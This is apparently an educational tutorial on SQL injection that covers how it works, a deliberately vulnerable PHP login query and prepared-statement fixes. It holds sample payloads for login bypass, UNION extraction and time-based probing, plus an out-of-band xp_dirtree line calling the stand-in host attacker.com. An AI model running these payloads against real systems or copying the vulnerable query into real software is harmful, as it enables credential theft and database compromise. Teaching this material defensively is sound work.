1Understanding SQL Injection

SQL injection is a code injection technique that exploits vulnerabilities in an application's database layer. Attackers can manipulate SQL queries to access, modify, or delete data they shouldn't have access to.

How SQL Injection Works:

  • User Input: Application accepts user input without proper validation
  • Query Construction: Input is directly concatenated into SQL queries
  • Malicious Payload: Attacker injects SQL code through input fields
  • Database Execution: Database executes the malicious SQL commands
  • Data Exposure: Sensitive data is accessed or manipulated

4Technical Analysis

Vulnerable Code Example (PHP):

$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($connection, $query);

Why This is Vulnerable:

  • Direct Concatenation: User input directly inserted into SQL query
  • No Input Validation: Special characters not escaped or filtered
  • No Parameterization: Query structure can be modified by user input
  • Insufficient Access Controls: Database user has excessive privileges
Attack Example:

Input: username = "admin'--", password = "anything"

Generated Query:
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'

Executed Query:
SELECT * FROM users WHERE username = 'admin'
-- (password check is commented out)

5Types of SQL Injection

In-Band SQLi

Error-based: Uses database error messages to extract information

Union-based: Uses UNION operator to combine results from multiple queries

' UNION SELECT username, password FROM users--

Blind SQLi

Boolean-based: Uses true/false responses to extract data

Time-based: Uses database delays to infer information

' AND (SELECT SLEEP(5))--

Out-of-Band SQLi

Uses different communication channels (DNS, HTTP) to extract data

Less common but can bypass certain security measures

'; EXEC xp_dirtree '\\\\attacker.com\\share'--

6Prevention and Mitigation

Secure Coding Practices:

1. Parameterized Queries (Prepared Statements):

Secure PHP Example:

$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$user = $stmt->fetch();

2. Input Validation and Sanitization:

  • Whitelist allowed characters
  • Escape special SQL characters
  • Validate data types and lengths
  • Use regular expressions for format validation

3. Principle of Least Privilege:

  • Database users should have minimal necessary permissions
  • Separate database accounts for different application functions
  • Disable unnecessary database features and functions
  • Regular security audits and access reviews

4. Additional Security Measures:

  • Web Application Firewalls (WAF): Filter malicious requests
  • Database Activity Monitoring: Detect suspicious queries
  • Regular Security Testing: Automated and manual testing
  • Error Handling: Don't expose database errors to users

7Real-World Impact

Consequences of SQL Injection:

  • Data Breach: Unauthorized access to sensitive information
  • Data Manipulation: Modification or deletion of critical data
  • Authentication Bypass: Unauthorized system access
  • Privilege Escalation: Gaining administrative access
  • Denial of Service: Database performance degradation
  • Compliance Violations: GDPR, HIPAA, PCI-DSS penalties
  • Reputation Damage: Loss of customer trust
  • Financial Loss: Direct costs and legal liabilities
Key Takeaways:
  • Always use parameterized queries/prepared statements
  • Validate and sanitize all user input
  • Implement proper error handling that doesn't expose system details
  • Follow the principle of least privilege for database access
  • Regular security testing and code reviews are essential
  • SQL injection remains one of the most critical web application vulnerabilities
